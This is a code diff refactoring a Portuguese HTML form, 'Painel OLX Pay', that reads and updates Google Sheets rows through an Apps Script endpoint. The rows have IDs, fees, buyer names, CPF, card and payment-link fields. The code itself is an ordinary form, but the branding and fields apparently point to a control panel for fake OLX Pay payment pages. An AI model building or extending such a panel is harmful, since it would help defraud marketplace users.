@@ -1,82 +1,26 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Atualizar Dados - Painel OLX Pay</title>
 <style>
-  body {
-    background-color: #1e1e1e;
-    color: #fff;
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 20px;
-  }
-  h1 {
-    text-align: center;
-    margin-bottom: 25px;
-    color: #00bfa5;
-  }
-  form {
-    max-width: 500px;
-    margin: 0 auto;
-    background: #2b2b2b;
-    padding: 25px;
-    border-radius: 12px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.5);
-  }
-  label {
-    display: block;
-    margin-top: 12px;
-    font-weight: bold;
-    color: #e0e0e0;
-  }
-  input, select {
-    width: 100%;
-    padding: 10px;
-    margin-top: 5px;
-    border: none;
-    border-radius: 6px;
-    background: #3a3a3a;
-    color: #fff;
-    font-size: 14px;
-  }
-  input:focus, select:focus {
-    outline: 2px solid #00bfa5;
-  }
-  button {
-    width: 100%;
-    margin-top: 20px;
-    padding: 12px;
-    background-color: #00bfa5;
-    border: none;
-    border-radius: 8px;
-    color: #fff;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-    transition: background 0.3s;
-  }
-  button:hover {
-    background-color: #009e8e;
-  }
-  .msg {
-    text-align: center;
-    margin-top: 15px;
-    font-weight: bold;
-  }
-  .hidden {
-    display: none;
-  }
-  @media (max-width: 600px) {
-    body { padding: 15px; }
-    form { padding: 20px; }
-    input, select { font-size: 16px; }
-    button { font-size: 16px; }
-  }
+  body { background:#1e1e1e; color:#fff; font-family:Arial,sans-serif; margin:0; padding:20px; }
+  h1 { text-align:center; margin-bottom:25px; color:#00bfa5; }
+  form { max-width:500px; margin:0 auto; background:#2b2b2b; padding:25px; border-radius:12px; box-shadow:0 0 10px rgba(0,0,0,0.5);}
+  label { display:block; margin-top:12px; font-weight:bold; color:#e0e0e0;}
+  input, select { width:100%; padding:10px; margin-top:5px; border:none; border-radius:6px; background:#3a3a3a; color:#fff; font-size:14px;}
+  input:focus, select:focus { outline:2px solid #00bfa5;}
+  button { width:100%; margin-top:20px; padding:12px; background:#00bfa5; border:none; border-radius:8px; color:#fff; font-weight:bold; font-size:16px; cursor:pointer; transition:0.3s;}
+  button:hover { background:#009e8e;}
+  .msg { text-align:center; margin-top:15px; font-weight:bold;}
+  .hidden { display:none;}
+  @media(max-width:600px){ body{padding:15px;} form{padding:20px;} input,select,button{font-size:16px;} }
+  .refLabel { color:#b0f2d5; margin-bottom:4px; font-size:14px; font-weight:bold;}
 </style>
 </head>
 <body>
+
 <h1>Atualizar Dados da Planilha</h1>
 <form id="updateForm">
   <label for="id">Selecione o ID</label>
@@ -88,39 +32,28 @@
     <option value="pay0373">pay0373</option>
   </select>
 
-  <label>Taxa</label>
-  <input type="text" id="taxa" name="taxa">
+  <div id="taxaWrapper">
+    <div id="taxaLabel" class="refLabel"></div>
+    <label>Taxa</label>
+    <input type="text" id="taxa" name="taxa">
+  </div>
 
-  <label>Comprador</label>
-  <input type="text" id="comprador" name="comprador">
+  <div id="compradorWrapper">
+    <div id="compradorLabel" class="refLabel"></div>
+    <label>Comprador</label>
+    <input type="text" id="comprador" name="comprador">
+  </div>
 
   <div id="advancedFields" class="hidden">
-    <label>Valor</label>
-    <input type="text" id="valor" name="valor">
-
-    <label>Frete</label>
-    <input type="text" id="frete" name="frete">
-
-    <label>Tarifa</label>
-    <input type="text" id="tarifa" name="tarifa">
-
-    <label>CPF</label>
-    <input type="text" id="cpf" name="cpf">
-
-    <label>Cartão</label>
-    <input type="text" id="cartao" name="cartao">
-
-    <label>Vendas</label>
-    <input type="text" id="vendas" name="vendas">
-
-    <label>Atendimento</label>
-    <input type="text" id="atendimento" name="atendimento">
-
-    <label>Entrega</label>
-    <input type="text" id="entrega" name="entrega">
-
-    <label>Link de Pagamento</label>
-    <input type="text" id="linkPagamento" name="linkPagamento">
+    <label>Valor</label><input type="text" id="valor" name="valor">
+    <label>Frete</label><input type="text" id="frete" name="frete">
+    <label>Tarifa</label><input type="text" id="tarifa" name="tarifa">
+    <label>CPF</label><input type="text" id="cpf" name="cpf">
+    <label>Cartão</label><input type="text" id="cartao" name="cartao">
+    <label>Vendas</label><input type="text" id="vendas" name="vendas">
+    <label>Atendimento</label><input type="text" id="atendimento" name="atendimento">
+    <label>Entrega</label><input type="text" id="entrega" name="entrega">
+    <label>Link de Pagamento</label><input type="text" id="linkPagamento" name="linkPagamento">
   </div>
 
   <button type="button" id="toggleAdvanced">Atualização avançada</button>
@@ -134,97 +67,50 @@ const MSG = document.getElementById('msg');
 const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec';
 const toggleBtn = document.getElementById('toggleAdvanced');
 const advancedFields = document.getElementById('advancedFields');
+const taxaLabel = document.getElementById('taxaLabel');
+const compradorLabel = document.getElementById('compradorLabel');
 
-// Cria labels de referência
-const taxaLabel = document.createElement('div');
-taxaLabel.style.color = '#b0f2d5';
-taxaLabel.style.marginBottom = '4px';
-taxaLabel.style.fontSize = '14px';
-taxaLabel.style.fontWeight = 'bold';
-FORM.querySelector('#taxa').parentNode.insertBefore(taxaLabel, FORM.querySelector('#taxa'));
+toggleBtn.addEventListener('click', () => advancedFields.classList.toggle('hidden'));
 
-const compradorLabel = document.createElement('div');
-compradorLabel.style.color = '#b0f2d5';
-compradorLabel.style.marginBottom = '4px';
-compradorLabel.style.fontSize = '14px';
-compradorLabel.style.fontWeight = 'bold';
-FORM.querySelector('#comprador').parentNode.insertBefore(compradorLabel, FORM.querySelector('#comprador'));
-
-toggleBtn.addEventListener('click', () => {
-  advancedFields.classList.toggle('hidden');
-});
-
-// Função para buscar dados da planilha
 async function carregarReferencia(id) {
-  if (!id) {
-    taxaLabel.textContent = '';
-    compradorLabel.textContent = '';
-    return;
-  }
-
+  if (!id) { taxaLabel.textContent=''; compradorLabel.textContent=''; return; }
   try {
-    // Aqui usamos GET para buscar dados da planilha
     const res = await fetch(`${WEB_APP_URL}?id=${id}`);
     const data = await res.json();
-
-    if (data.status === 'success') {
-      taxaLabel.textContent = `Taxa atual: ${data.taxa || '---'}`;
-      compradorLabel.textContent = `Comprador atual: ${data.comprador || '---'}`;
-    } else {
-      taxaLabel.textContent = '';
-      compradorLabel.textContent = '';
-      MSG.textContent = data.message;
-    }
-  } catch (err) {
-    console.error(err);
-    MSG.textContent = '❌ Erro ao buscar dados.';
-  }
+    if(data.status==='success'){
+      taxaLabel.textContent = `Taxa atual: ${data.taxa||'---'}`;
+      compradorLabel.textContent = `Comprador atual: ${data.comprador||'---'}`;
+    } else { taxaLabel.textContent=''; compradorLabel.textContent=''; MSG.textContent = data.message; }
+  } catch(err){ console.error(err); MSG.textContent='❌ Erro ao buscar dados.'; }
 }
 
-// Quando muda o ID
-document.getElementById('id').addEventListener('change', (e) => {
-  const selectedId = e.target.value;
-  carregarReferencia(selectedId);
-});
+document.getElementById('id').addEventListener('change', e => carregarReferencia(e.target.value));
 
-// Envio do formulário
-FORM.addEventListener('submit', async (e) => {
+FORM.addEventListener('submit', async e => {
   e.preventDefault();
-
   const formData = new FormData(FORM);
   const dados = {};
+  formData.forEach((v,k)=>{ if(v.trim()!=='') dados[k]=v.toString(); });
 
-  formData.forEach((value, key) => {
-    if (value.trim() !== '') {
-      dados[key] = value.toString();
-    }
-  });
-
-  if (!dados.id) {
-    MSG.textContent = '❌ Selecione um ID.';
-    return;
-  }
+  if(!dados.id){ MSG.textContent='❌ Selecione um ID.'; return; }
 
   try {
-    MSG.textContent = 'Salvando...';
-    await fetch(WEB_APP_URL, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'application/json' },
+    MSG.textContent='Salvando...';
+    await fetch(WEB_APP_URL,{
+      method:'POST',
+      mode:'no-cors',
+      headers:{'Content-Type':'application/json'},
       body: JSON.stringify(dados)
     });
-    MSG.textContent = '✅ Dados atualizados com sucesso!';
+    MSG.textContent='✅ Dados atualizados com sucesso!';
     FORM.reset();
     advancedFields.classList.add('hidden');
-    taxaLabel.textContent = '';
-    compradorLabel.textContent = '';
-  } catch (error) {
-    console.error(error);
-    MSG.textContent = '❌ Erro ao enviar dados.';
-  }
+    taxaLabel.textContent='';
+    compradorLabel.textContent='';
+  } catch(err){ console.error(err); MSG.textContent='❌ Erro ao enviar dados.'; }
 
-  setTimeout(() => { MSG.textContent = ''; }, 3000);
+  setTimeout(()=>{ MSG.textContent=''; },3000);
 });
 </script>
 </body>
-  </html>
+</html>
